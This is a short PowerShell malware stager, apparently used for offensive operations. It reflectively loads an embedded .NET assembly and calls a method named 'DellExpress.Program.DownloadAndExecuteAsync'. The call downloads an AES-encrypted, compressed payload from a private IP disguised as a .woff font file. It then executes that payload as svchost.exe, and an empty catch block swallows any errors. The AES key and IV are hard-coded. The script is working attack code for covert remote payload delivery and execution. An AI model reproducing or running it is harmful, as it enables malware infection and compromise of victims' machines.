try {
    $encodeStr = ""

    $decodeStr = [System.Convert]::FromBase64String($encodeStr)

    [System.Reflection.Assembly]::Load($decodeStr)

    $url = "https://192.168.45.181:8080/test.woff"
    $TargetBinary = "svchost.exe"

    [byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74,0x36,0x76,0x39,0x79,0x24,0x42,0x26,0x45,0x29,0x48,0x40,0x4d,0x63,0x51,0x66,0x54

    [byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56

    $CompressionAlgorithm = "deflate9"
    [DellExpress.Program]::DownloadAndExecuteAsync($url, $TargetBinary, $CompressionAlgorithm, $AESKey, $AESIV).GetAwaiter().GetResult()

} catch {
}
